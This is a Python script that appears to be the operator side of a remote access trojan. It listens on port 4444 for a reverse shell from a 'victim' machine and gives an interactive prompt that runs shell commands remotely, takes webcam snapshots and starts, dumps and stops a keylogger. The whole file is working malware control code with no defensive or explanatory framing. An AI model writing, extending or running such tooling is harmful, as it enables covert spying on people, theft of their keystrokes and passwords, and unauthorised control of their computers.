import socket
import base64
import time

# Specify the port on which the attacker will listen
attacker_ip = '0.0.0.0'  # Listen on all available interfaces
attacker_port = 4444      # Port number should match the victim's script

# Set up the listener
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((attacker_ip, attacker_port))
server.listen(1)
print(f"Listening on {attacker_ip}:{attacker_port}...")

# Accept a connection from the victim (reverse shell)
client_socket, client_address = server.accept()
print(f"Connection established with {client_address}")

# Interact with the victim machine
while True:
    # Receive command from the attacker to send to the victim
    command = input("Shell> ")

    if command.lower() == 'exit':
        client_socket.send(b'exit')  # Send exit command to the victim
        break

    if command.lower() == 'webcam_snap':
        # Send the webcam snap command to the victim
        client_socket.send(command.encode())

        # Receive the base64-encoded image from the victim
        image_data = client_socket.recv(1024).decode('utf-8')

        # If an image is received, display it
        if image_data:
            print("Received webcam snapshot")
            img_data = base64.b64decode(image_data)

            # Save the image as a file or display it
            with open("webcam_snap.jpg", "wb") as f:
                f.write(img_data)
            print("Image saved as webcam_snap.jpg")
        else:
            print("Failed to capture image.")
    elif command.lower() == 'key_start':
        # Start keylogger
        client_socket.send(command.encode())
        print("Keylogger started on the victim machine.")
    elif command.lower() == 'key_dump':
        # Dump keylogs
        client_socket.send(command.encode())
        keylogs = client_socket.recv(1024).decode('utf-8')
        if keylogs:
            print(f"Keylogs received: {keylogs}")
        else:
            print("No keylogs recorded.")
    elif command.lower() == 'key_stop':
        # Stop keylogger
        client_socket.send(command.encode())
        print("Keylogger stopped on the victim machine.")
    else:
        # Send a regular shell command
        client_socket.send(command.encode())

        # Receive the output of the command from the victim
        response = client_socket.recv(1024)
        print(response.decode(), end="")

# Close the connection when done
client_socket.close()
server.close()
